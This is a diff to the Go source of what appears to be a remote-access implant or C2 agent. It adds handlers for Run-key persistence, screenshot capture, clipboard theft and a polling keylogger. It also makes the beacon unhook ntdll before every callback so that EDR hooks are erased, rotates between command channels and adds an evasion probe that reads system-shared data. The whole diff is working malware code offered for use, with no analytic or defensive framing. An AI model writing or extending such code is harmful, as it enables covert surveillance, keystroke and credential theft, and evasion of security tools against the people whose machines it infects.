@@ -9,6 +9,7 @@ import (
 	"math/rand"
 	"os"
 	"os/exec"
+	"sync"
 	"time"
 
 	"github.com/VoidSecSoftwares/voidsyscall/channels"
@@ -23,9 +24,15 @@ type Agent struct {
 	ctx      context.Context
 	cancel   context.CancelFunc
 
-	stageBuf   []byte
-	sleepKey   []byte
-	beaconCtr  int
+	stageBuf []byte
+	sleepKey []byte
+
+	chanCursor int
+
+	keylogOn     bool
+	keylogBuf    []byte
+	keylogMu     sync.Mutex
+	keylogCancel context.CancelFunc
 }
 
 type TaskType uint8
@@ -47,6 +54,10 @@ const (
 	TaskToken       TaskType = 0x14
 	TaskProcs       TaskType = 0x15
 	TaskKillProc    TaskType = 0x16
+	TaskPersist     TaskType = 0x17
+	TaskScreenshot  TaskType = 0x18
+	TaskKeylog      TaskType = 0x19
+	TaskClipboard   TaskType = 0x1A
 )
 
 type TaskResult struct {
@@ -113,14 +124,20 @@ func (a *Agent) Run() {
 }
 
 func (a *Agent) beacon() *channels.Message {
-	a.beaconCtr++
-	if a.config.UnhookEvery > 0 && a.beaconCtr%a.config.UnhookEvery == 0 {
-		go func() {
-			_, _ = syscallwin.CheckAndUnhook()
-		}()
+	// Before every beacon burst, reconcile ntdll with the clean disk image.
+	// An EDR that re-hooked during the sleep window is erased before the
+	// callback makes any syscall worth inspecting.
+	if _, err := syscallwin.CheckAndUnhook(); err != nil {
+		_ = err
 	}
 
-	for _, ch := range a.channels {
+	// Round-robin over the configured channels so a dead transport does not
+	// become a permanent preference; beacons naturally rotate.
+	n := len(a.channels)
+	for i := 0; i < n; i++ {
+		idx := (a.chanCursor + i) % n
+		ch := a.channels[idx]
+
 		msg := &channels.Message{
 			Type: 0x01, // Beacon
 			Data: nil,
@@ -134,8 +151,10 @@ func (a *Agent) beacon() *channels.Message {
 		if err != nil {
 			continue
 		}
+		a.chanCursor = (idx + 1) % n
 		return resp
 	}
+	a.chanCursor = (a.chanCursor + 1) % n
 	return nil
 }
 
@@ -183,6 +202,14 @@ func (a *Agent) executeTask(task *channels.Message) *TaskResult {
 		return a.handleProcs(task, result, taskData)
 	case TaskKillProc:
 		return a.handleKillProc(task, result, taskData)
+	case TaskPersist:
+		return a.handlePersist(task, result, taskData)
+	case TaskScreenshot:
+		return a.handleScreenshot(task, result, taskData)
+	case TaskKeylog:
+		return a.handleKeylog(task, result, taskData)
+	case TaskClipboard:
+		return a.handleClipboard(task, result, taskData)
 	case TaskExit:
 		a.running = false
 		result.Status = 0x00
@@ -379,10 +406,203 @@ func (a *Agent) handleKillProc(task *channels.Message, result *TaskResult, data 
 	return result
 }
 
+func (a *Agent) handlePersist(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	valueName := string(data)
+	if valueName == "" {
+		valueName = "VoidSecService"
+	}
+	if err := syscallwin.PersistRunKey(valueName); err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+	result.Status = 0x00
+	result.Output = []byte(fmt.Sprintf("persisted in Run key as %q", valueName))
+	return result
+}
+
+func (a *Agent) handleScreenshot(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if err := syscallwin.InitWin32u(); err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+	bmp, err := syscallwin.Screenshot()
+	if err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+	result.Status = 0x00
+	result.Output = bmp
+	return result
+}
+
+func (a *Agent) handleClipboard(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if err := syscallwin.InitWin32u(); err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+	txt, err := syscallwin.ClipboardText()
+	if err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+	result.Status = 0x00
+	result.Output = txt
+	return result
+}
+
+func (a *Agent) handleKeylog(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) < 1 {
+		result.Status = 0x01
+		result.Output = []byte("keylog: sub-command required (1=start, 2=stop, 3=dump)")
+		return result
+	}
+
+	switch data[0] {
+	case 0x01:
+		if a.keylogOn {
+			result.Status = 0x00
+			result.Output = []byte("keylog already running")
+			return result
+		}
+		if err := syscallwin.InitWin32u(); err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		ctx, cancel := context.WithCancel(a.ctx)
+		a.keylogCancel = cancel
+		a.keylogOn = true
+		go a.keylogLoop(ctx)
+		result.Status = 0x00
+		result.Output = []byte("keylog started")
+	case 0x02:
+		if a.keylogCancel != nil {
+			a.keylogCancel()
+		}
+		a.keylogOn = false
+		result.Status = 0x00
+		result.Output = []byte("keylog stopped")
+	case 0x03:
+		a.keylogMu.Lock()
+		buf := append([]byte(nil), a.keylogBuf...)
+		a.keylogMu.Unlock()
+		result.Status = 0x00
+		result.Output = buf
+	default:
+		result.Status = 0x01
+		result.Output = []byte("unknown keylog sub-command")
+	}
+	return result
+}
+
+// keylogLoop polls the async key state for every VK of interest and appends
+// a printable rune on each fresh press. The buffer is capped to 256 KiB.
+func (a *Agent) keylogLoop(ctx context.Context) {
+	prev := make(map[byte]bool)
+	t := time.NewTicker(30 * time.Millisecond)
+	defer t.Stop()
+
+	for {
+		select {
+		case <-ctx.Done():
+			a.keylogOn = false
+			return
+		case <-t.C:
+		}
+
+		for vk := byte(0x08); vk <= 0x5A; vk++ {
+			down := syscallwin.IsKeyDown(vk)
+			if !down || prev[vk] {
+				prev[vk] = down
+				continue
+			}
+			prev[vk] = true
+
+			r := keylogRune(vk, syscallwin.IsKeyDown(0x10))
+			if r == "" {
+				continue
+			}
+			a.appendKeylog([]byte(r))
+		}
+	}
+}
+
+const maxKeylogBytes = 256 * 1024
+
+// appendKeylog appends to the keylog buffer, refusing to exceed the cap.
+func (a *Agent) appendKeylog(b []byte) {
+	a.keylogMu.Lock()
+	defer a.keylogMu.Unlock()
+	if len(a.keylogBuf) >= maxKeylogBytes {
+		return
+	}
+	room := maxKeylogBytes - len(a.keylogBuf)
+	if len(b) > room {
+		b = b[:room]
+	}
+	a.keylogBuf = append(a.keylogBuf, b...)
+}
+
+// keylogRune maps a virtual-key code plus shift state to a UTF-8 fragment.
+func keylogRune(vk byte, shift bool) string {
+	switch vk {
+	case 0x0D:
+		return "\n"
+	case 0x09:
+		return "\t"
+	case 0x20:
+		return " "
+	case 0x08:
+		return "[BS]"
+	case 0x1B:
+		return "[ESC]"
+	}
+	if vk >= 0x30 && vk <= 0x39 {
+		if shift {
+			return []string{")", "!", "@", "#", "$", "%", "^", "&", "*", "("}[vk-0x30]
+		}
+		return string(vk)
+	}
+	if vk >= 0x41 && vk <= 0x5A {
+		if !shift {
+			return string(vk + 0x20)
+		}
+		return string(vk)
+	}
+	if vk >= 0x60 && vk <= 0x69 {
+		return string(vk - 0x30)
+	}
+	var punct = map[byte][2]string{
+		0xBA: {";", ":"},
+		0xBB: {"=", "+"},
+		0xBC: {",", "<"},
+		0xBD: {"-", "_"},
+		0xBE: {".", ">"},
+		0xBF: {"/", "?"},
+		0xC0: {"`", "~"},
+		0xDB: {"[", "{"},
+		0xDC: {`\`, "|"},
+		0xDD: {"]", "}"},
+		0xDE: {"'", `"`},
+	}
+	if p, ok := punct[vk]; ok {
+		if shift {
+			return p[1]
+		}
+		return p[0]
+	}
+	return ""
+}
+
 func (a *Agent) handleEvasion(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
 	if len(data) < 1 {
 		result.Status = 0x01
-		result.Output = []byte("evasion: sub-command required (1=full, 2=vm, 3=sandbox, 4=debug, 5=timing, 6=report, 7=hookscan, 8=erase)")
+		result.Output = []byte("evasion: sub-command required (1=full, 2=vm, 3=sandbox, 4=debug, 5=timing, 6=report, 7=hookscan, 8=erase, 9=shared)")
 		return result
 	}
 
@@ -455,6 +675,17 @@ func (a *Agent) handleEvasion(task *channels.Message, result *TaskResult, data [
 		}
 		result.Status = 0x00
 		result.Output = []byte("self PE header erased")
+	case 0x09:
+		info, err := syscallwin.ReadKUserShared()
+		if err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("uptime=%dm phys_pages=%d console=%d tz=%d tickmul=%d sys=0x%x",
+			info.BootedMinutes(), info.NumberPhysicalPages, info.ActiveConsoleId,
+			info.TimeZoneId, info.TickCountMultiplier, info.SystemTime100ns))
 	default:
 		result.Status = 0x01
 		result.Output = []byte("unknown evasion sub-command")
